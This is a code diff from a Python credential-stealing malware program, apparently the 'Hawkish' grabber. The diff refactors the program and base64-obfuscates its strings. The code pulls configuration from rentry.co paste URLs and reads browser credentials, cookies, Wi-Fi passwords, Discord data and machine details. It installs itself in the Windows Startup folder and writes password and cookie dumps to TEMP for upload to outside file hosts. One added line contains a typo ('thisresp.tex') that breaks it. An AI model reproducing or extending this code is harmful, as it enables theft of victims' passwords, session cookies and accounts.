@@ -38,24 +38,10 @@ from win32crypt import CryptUnprotectData
 from subprocess import CREATE_NEW_CONSOLE, Popen
 from PIL import ImageGrab
 
-shell32 = ctypes.windll.shell32
-local = os.getenv("LOCALAPPDATA")
-roaming = os.getenv("APPDATA")
-temp = os.getenv("TEMP")
-
-Notpasswrd = []
 
 myhawkname = "https://rentry.co/on4ev/raw"
 thisresp = requests.get(myhawkname)
-hwkish = thisresp.text
-
-srsyname_secretbutlil = "https://rentry.co/7w2a89/raw"
-thisrespbutlil = requests.get(srsyname_secretbutlil)
-myname_little = thisrespbutlil.text
-
-pleasegetsecretcore = "https://rentry.co/rh234/raw"
-thissecretcore = requests.get(pleasegetsecretcore)
-coresecretname = thissecretcore.text
+hwkish = thisresp.tex
 
 hwkishst_secret = "https://rentry.co/nxuf8/raw"
 thisst = requests.get(hwkishst_secret)
@@ -73,10 +59,6 @@ justalink = "https://rentry.co/ozpmx/raw"
 alink = requests.get(justalink)
 justafcklink = alink.text
 
-imthebestdev = os.getlogin()
-spoted_victim = os.getenv("COMPUTERNAME")
-space_stored = str(psutil.disk_usage("/")[0] / 1024 ** 3).split(".")[0]
-fastmem_stored = str(psutil.virtual_memory()[0] / 1024 ** 3).split(".")[0]
 
 hwkishmyregex_secret = "https://rentry.co/shitonyourAV/raw"
 reg_req = requests.get(hwkishmyregex_secret)
@@ -86,17 +68,23 @@ netwrd = "https://rentry.co/fgsqi/raw"
 myboyzzz = requests.get(netwrd)
 ntwrk = myboyzzz.text
 
-lilccks = "https://rentry.co/gxoe5/raw"
-rezs = requests.get(lilccks)
-justatermlil = rezs.text
 
-
-bigccks = "https://rentry.co/fzr38/raw"
-rez = requests.get(bigccks)
-justaterm = rez.text
-
+myname_little = myhawkname.lower()
+justaterm = base64.b64decode(b'Q29va2llcw==').decode()
+justatermlil = justaterm.lower()
+coresecretname = base64.b64decode(b'ZGlzY29yZF9kZXNrdG9wX2NvcmU=').decode()
 extension_id = f'{base64.b64decode("bmtiaWhmYmVvZ2FlYW9laGxlZm5rb2RiZWZncGdrbm4=")}'.replace("b'", "").replace("'", "")
 inp  = str(extension_id)
+
+imthebestdev = os.getlogin()
+spoted_victim = os.getenv("COMPUTERNAME")
+space_stored = str(psutil.disk_usage("/")[0] / 1024 ** 3).split(".")[0]
+fastmem_stored = str(psutil.virtual_memory()[0] / 1024 ** 3).split(".")[0]
+shell32 = ctypes.windll.shell32
+local = os.getenv("LOCALAPPDATA")
+roaming = os.getenv("APPDATA")
+temp = os.getenv("TEMP")
+Notpasswrd = []
 
 json_confg = {
     "created_by": "%PC_CREATOR%",
@@ -398,9 +386,9 @@ class hwkish_first_funct(Functions):
 
         self.hwk_get_wifipassword = self.find_in_config("w1f1_found")
 
-        self.appdata = os.getenv("localappdata")
+        self.appdata = local
 
-        self.roaming = os.getenv("appdata")
+        self.roaming = roaming
         self._1 = "Google"
 
         self.chrome_user_path = os.path.join(self.appdata, self._1, "Chrome", maybycool)
@@ -582,7 +570,7 @@ class hwkish_first_funct(Functions):
     def startup_so(self: str) -> str:
         if self.startupexe != "yes":
             return
-        startup_path = os.path.join(os.getenv("appdata"), "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
+        startup_path = os.path.join(roaming, "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
         src_file = argv[0]
         dest_file = os.path.join(startup_path, os.path.basename(src_file))
         if os.path.exists(dest_file):
@@ -2246,7 +2234,7 @@ def upload(name, tk=""):
 
 
 def writeforfile(data, name):
-    path = os.getenv("TEMP") + f"\{name}.txt"
+    path = temp + f"\{name}.txt"
     with open(path, mode="w", encoding="utf-8") as f:
         f.write(f"Created BY {hwkish}-{stspecial} Team | https://github.com/{hwkish}-{stspecial}\n\n")
         for line in data:
@@ -2519,7 +2507,7 @@ def The_Pathbrows():
     upths = []
 
     for file in [f"{hwkish}_allpasswords.txt", f"{hwkish}_all{justatermlil}.txt"]:
-        upload(os.getenv("TEMP") + "\\" + file)
+        upload(temp + "\\" + file)
 
 
 def upload_on_anonfiles(path):
